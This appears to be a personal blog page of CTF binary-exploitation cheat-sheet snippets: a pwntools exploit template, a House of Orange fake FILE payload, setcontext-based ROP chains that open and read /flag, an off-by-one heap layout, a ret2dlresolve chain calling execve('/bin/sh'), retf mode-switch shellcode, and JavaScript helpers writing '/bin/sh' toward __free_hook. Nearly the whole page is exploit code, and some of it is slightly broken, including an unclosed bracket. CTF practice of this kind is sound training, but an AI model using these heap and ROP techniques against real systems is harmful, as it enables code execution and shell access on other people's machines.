---
layout: page
title: cheatsheet
permalink: /cheatsheet/
---

# PwntoolsExp
```sh
echo "from pwn import *" > exp.py
echo "context.log_level='debug'" >> exp.py
echo "context.arch='amd64'" >> exp.py
echo "context.terminal=['tmux','split','-h']" >> exp.py
echo "p=process('./pwn')" >> exp.py
echo "gdb.attach(p)">> exp.py
echo "p.interactive()">> exp.py
```
# House of Orange
```python
fio=0#fake io_file addr
fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake = fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake = fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])
```
# Setcontext(RDI)
```python
#Setcontext Module Start>>>> 
libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc.address=base

rop = ROP(libc)
sys = rop.find_gadget(['pop rdx','ret'])[0]

# Please set rsp == Free's first Parameter (if you are gonna to hijack free_hook)
rsp=heap+0x10

rdi=0
rsi=rsp
rdx=0x100
rbp=rsi-8
rcx=sys
payload=payload.ljust(0x68,b'\0')+flat([rdi,rsi,rbp,0,rdx,0,0,rsp,rcx])

edit(2,payload)
free(2)

rop.read(3,heap,0x100)
rop.write(1,heap,0x100)
rop.dump()
p2 =rop.chain()

syscall=0xcf6c5+base
rax = rop.find_gadget(['pop rax','ret'])[0]
rdi = rop.find_gadget(['pop rdi','ret'])[0]
rsi = rop.find_gadget(['pop rsi','ret'])[0]
rdx = rop.find_gadget(['pop rdx','ret'])[0]
p1 =flat([rax,0x2,rdi,heap+0x110,rsi,0,rdx,0,sys)

pay=p1+p2
p.send(pay.ljust(0x100,b'\0')+b'/flag\0')
#Setcontext Module END>>>> 
```
# Setcontext(RDX)
`getkeyserv_handle+576`
`searchmem 0x2404894808578b48`

```python
#Setcontext Module Start>>>> 
#++++++++++++++++++++++++++++++
# Before starting this module, I 
# hope you have set free_hook
# ==> magic gadget 0x2404894808578b48
chunk=heap+0x10
# chunk is Free's first Parameter
#+++++++++++++++++++++++++++++++
payload=p64(0)+p64(chunk)+b'\0'*0x10+p64(0x55e35+base)
libc=ELF("/lib/x86_64-linux-gnu/libc-2.29.so")
libc.address=base
rop = ROP(libc)
sys = rop.find_gadget(['syscall','ret'])[0]
rsp=chunk
rdi=0
rsi=rsp
rdx=0x110
rbp=rsi-8
rcx=sys
payload=payload.ljust(0x68,b'\0')+flat([rdi,rsi,rbp,0,rdx,0,0,rsp,rcx])
edit(2,payload)
gdb.attach(p,'b free')
free(2)

rop.read(3,chunk+0x110,0x100)
rop.write(1,chunk+0x110,0x100)
rop.dump()
pyaload_rw =rop.chain()

rax = rop.find_gadget(['pop rax','ret'])[0]
rdi = rop.find_gadget(['pop rdi','ret'])[0]
rsi = rop.find_gadget(['pop rsi','ret'])[0]
rdx = rop.find_gadget(['pop rdx','ret'])[0]
pyaload_open =flat([rax,0x2,rdi,chunk+0xf8,rsi,0,rdx,0,sys])
pay = pyaload_open+pyaload_rw
p.send(pay.ljust(0xf8,b'\0')+b'/flag\0')
#Setcontext Module END>>>> 
```

# OffByOne Shrinke
```python
add(0x400)#0
add(0x88)#1
add(0x18)#2
free(0)
add(0x18)#0
edit(0x18,"A"*0x18)
add(0x88)#3
add(0x88)#4
free(3)
free(1)
```
# _dl_runtime_resolve
```python
rop = ROP("./pwn")
elf = ELF("./pwn")
#dl = Ret2dlresolvePayload(elf,symbol='system',args=["/bin/sh"])
dl = Ret2dlresolvePayload(elf,symbol='execve',args=["/bin/sh",0,0])
rop.read(0,dl.data_addr)
rop.ret2dlresolve(dl)
#print(rop.dump())
p.send("\0"*pad+str(rop))
raw_input()
p.send(dl.payload)
```

# retf
```python
to32='\xC7\x44\x24\x04\x23\x00\x00\x00\xCB'
to64='\xC7\x44\x24\x04\x33\x00\x00\x00\xCB'
# to32:                           ;;将CPU模式转换为32位
#     mov DWORD [rsp+4],0x23      ;;32位
#     retf
# to64:                           ;;将CPU模式转换为64位
#     mov DWORD [esp+4],0x33      ;;64位
#     retf
```

# orw
```python
rop = ROP(libc)
rop.read(3,chunk+0x110,0x100)
rop.write(1,chunk+0x110,0x100)
rop.dump()
pyaload_rw =rop.chain()

sys = rop.find_gadget(['syscall','ret'])[0]
rax = rop.find_gadget(['pop rax','ret'])[0]
rdi = rop.find_gadget(['pop rdi','ret'])[0]
rsi = rop.find_gadget(['pop rsi','ret'])[0]
rdx = rop.find_gadget(['pop rdx','ret'])[0]
pyaload_open =flat([rax,0x2,rdi,chunk+0xf8,rsi,0,rdx,0,sys])
pay = pyaload_open+pyaload_rw
```

# JavaScript
```js
var _b = new ArrayBuffer(16);
var _f = new Float64Array(_b);
var _i = new BigUint64Array(_b);
function f2i(f)
{
	_f[0] = f;
	return _i[0];
}
function i2f(i)
{
	_i[0] = i;
	return _f[0];
}
function hex(i)
{
	return "0x"+i.toString(16).padStart(16,"0");
}
```

# Trigger to __free_hook
```js
function get_shell()
{
    let get_shell_buffer = new ArrayBuffer(0x1000);
    let get_shell_dataview = new DataView(get_shell_buffer);
    get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn));
}
get_shell();
```